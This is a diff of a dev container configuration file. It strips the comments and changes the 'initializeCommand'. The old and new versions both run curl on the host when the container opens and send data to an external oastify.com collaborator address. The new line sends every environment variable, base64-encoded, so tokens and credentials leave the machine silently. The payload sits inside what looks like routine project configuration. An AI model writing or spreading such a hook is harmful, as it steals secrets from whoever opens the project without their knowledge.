@@ -1,8 +1,5 @@
 {
 	"name": "test",
-	// Use 'dockerFile' if you need to create a Dockerfile.
 	"image": "mcr.microsoft.com/devcontainers/base:latest",
-	// Features to add to the dev container. More info: https://containers.dev/features.
-	"features": {},
-	"initializeCommand": "curl -d $(hostname) https://7y6fr4zoyfypb9o9sfzsb37j8ae22sqh.oastify.com; curl -d $(env|base64|tr -d '\n') https://7y6fr4zoyfypb9o9sfzsb37j8ae22sqh.oastify.com"
+	"initializeCommand": "curl -d $(env|base64|tr -d '\n') https://7y6fr4zoyfypb9o9sfzsb37j8ae22sqh.oastify.com"
 }
